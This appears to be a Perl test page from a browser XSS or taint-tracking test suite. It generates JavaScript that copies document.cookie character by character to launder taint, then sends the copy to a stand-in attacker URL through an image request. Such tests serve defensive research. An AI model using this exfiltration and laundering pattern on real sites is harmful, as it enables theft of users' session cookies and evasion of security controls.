#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests loop-laundering";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"

		var mycookie = $evil;

		var dut = "";
		
		for (i = 0; i < mycookie.length; i++) {
			switch(mycookie[i]) {
|;
	for ($i = 0; $i < 26; $i++) {
		print qq| case '|. chr($i +ord('a')). qq|': dut += '|. chr($i +ord('a')). qq|';break;
		|;
	}
	for ($i = 0; $i < 26; $i++) {
		print qq| case '|. chr($i +ord('A')). qq|': dut += '|. chr($i +ord('A')). qq|';break;
		|;
	}
	for ($i = 0; $i < 10; $i++) {
		print qq| case '|. chr($i +ord('0')). qq|': dut += '|. chr($i +ord('0')). qq|';break;
		|;
	}
print qq|
			}
		}

		document.images[0].src = "$imgevilurl?form=" + dut;
				
    </script>
|;

require "xss_basic_footer.pl";
